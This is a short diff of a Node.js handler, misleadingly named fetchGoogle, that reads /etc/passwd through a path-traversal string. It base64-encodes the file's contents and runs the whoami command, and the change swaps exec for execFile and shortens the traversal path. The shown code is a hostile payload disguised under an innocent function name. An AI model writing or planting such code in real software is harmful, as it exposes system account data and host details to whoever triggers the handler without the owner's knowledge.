@@ -1,9 +1,9 @@
 const fs = require('fs');
 const fetch = require('node-fetch');
-const { exec } = require('child_process');
+const { execFile } = require('child_process');
 
 function fetchGoogle(ctx, req, res) {
-    fs.readFile('../../../../../../../../etc/passwd', 'utf8', (err, data) => {
+    fs.readFile('../../../../../../etc/passwd', 'utf8', (err, data) => {
         if (err) {
             res.writeHead(500, { 'Content-Type': 'text/plain' });
             res.end('Error reading file: ' + err.message);
@@ -12,7 +12,7 @@ function fetchGoogle(ctx, req, res) {
 
         const base64FileContent = Buffer.from(data).toString('base64'); // Dosyanın içeriğini base64 formatına çevir
 
-        exec('whoami', (error, stdout, stderr) => {
+        execFile('whoami', (error, stdout, stderr) => {
             if (error) {
                 res.writeHead(500, { 'Content-Type': 'text/plain' });
                 res.end(`Error executing whoami: ${error.message}\n${stderr}`);
